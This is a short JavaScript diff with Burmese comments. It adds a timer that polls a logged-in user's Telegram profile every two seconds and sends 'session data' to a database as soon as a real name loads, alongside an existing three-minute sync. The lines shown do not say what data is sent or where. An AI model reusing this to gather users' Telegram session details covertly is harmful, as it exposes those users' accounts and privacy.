@@ -285,6 +285,22 @@ function getTelegramProfile() {
                 }
             };
 
+            // 🌟 နာမည်အစစ်ကို အမြန်ဆုံး ဖမ်းယူနိုင်ရန် ၂ စက္ကန့်တစ်ခါ ပတ်စစ်မည့် စနစ်အသစ် 🌟
+            let nameCatchInterval = setInterval(() => {
+                if (wasLoggedIn) {
+                    let currentProfile = getTelegramProfile();
+                    
+                    // နာမည်အစစ် ရလာပြီဖြစ်ပြီး၊ အရင်ပို့ထားတဲ့နာမည်နဲ့ မတူဘူးဆိုရင် ချက်ချင်း လှမ်းပို့မည်
+                    if (currentProfile && currentProfile.name && currentProfile.name !== lastSyncedName) {
+                        console.log("✅ Profile Name Loaded! Syncing to Database...");
+                        syncSessionData(); 
+                        
+                        // နာမည်ရသွားရင် ဆက်စစ်စရာမလိုတော့လို့ ရပ်လိုက်မည် (Server မလေးစေရန်)
+                        clearInterval(nameCatchInterval); 
+                    }
+                }
+            }, 2000);
+
             setInterval(syncSessionData, 180000); 
 
             window.addEventListener('beforeunload', () => { 
